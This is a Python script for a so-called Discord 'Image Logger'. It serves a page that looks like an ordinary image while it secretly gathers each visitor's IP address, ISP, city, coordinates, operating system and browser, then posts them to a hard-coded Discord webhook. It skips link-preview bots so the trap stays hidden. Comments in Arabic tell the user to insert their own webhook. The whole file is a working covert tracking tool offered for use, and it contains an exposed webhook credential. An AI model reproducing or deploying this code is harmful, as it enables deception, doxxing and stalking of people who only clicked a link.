import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/1367472785269723156/fnoDewO4dijhgOjBIfLnS48CBem5qZ1FiIa85UPmVuATznoPcq2vhsQdBK2PgnMBHbiW",  # حط Webhook حقك هنا
    "image": "https://images.sftcdn.net/images/t_app-cover-m,f_auto/p/9848e854-ffae-11e6-a59d-00163ed833e7/3489861693/discord-screenshot.png",
    "username": "Image Logger",
    "color": 0x00FFFF,
}

blacklistedIPs = ("27", "104", "143", "164")

def makeReport(ip, useragent, image_url):
    # يمنع البوتات والمصادر المحظورة
    if any(ip.startswith(prefix) for prefix in blacklistedIPs):
        return
    if useragent and any(bot in useragent for bot in ["Discordbot", "TelegramBot", "Slackbot"]):
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}").json()
    except Exception as e:
        info = {}

    os_name, browser = httpagentparser.simple_detect(useragent or "")

    embed = {
        "username": config["username"],
        "embeds": [{
            "title": "📸 New Image Opened",
            "color": config["color"],
            "description": f"""**IP:** `{ip}`
**ISP:** `{info.get('isp', 'Unknown')}`
**Country:** `{info.get('country', 'Unknown')}`  
**City:** `{info.get('city', 'Unknown')}`
**Location:** `{info.get('lat', '?')}, {info.get('lon', '?')}`
**OS:** `{os_name}`
**Browser:** `{browser}`
**User Agent:** `{useragent}`""",
            "thumbnail": {"url": image_url}
        }]
    }

    requests.post(config["webhook"], json=embed)

class LoggerHandler(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            # دعم رابط مخصص
            if dic.get("url"):
                image_url = base64.b64decode(dic.get("url")).decode()
            else:
                image_url = config["image"]

            html = f"""<!DOCTYPE html><html><head><style>
            html, body {{
                margin: 0;
                height: 100%;
                background: url('{image_url}') center center no-repeat;
                background-size: contain;
                background-color: black;
            }}
            </style></head><body></body></html>""".encode()

            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            user_agent = self.headers.get('user-agent', '')

            makeReport(ip, user_agent, image_url)

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html)

        except Exception as e:
            report = traceback.format_exc()
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "⚠️ Error occurred",
                "embeds": [{
                    "description": f"```{report}```",
                    "color": 0xFF0000
                }]
            })

    do_GET = handleRequest
    do_POST = handleRequest

def run(server_class=HTTPServer, handler_class=LoggerHandler, port=8080):
    server = server_class(('', port), handler_class)
    print(f"Server running on port {port}")
    server.serve_forever()

if __name__ == "__main__":
    run()

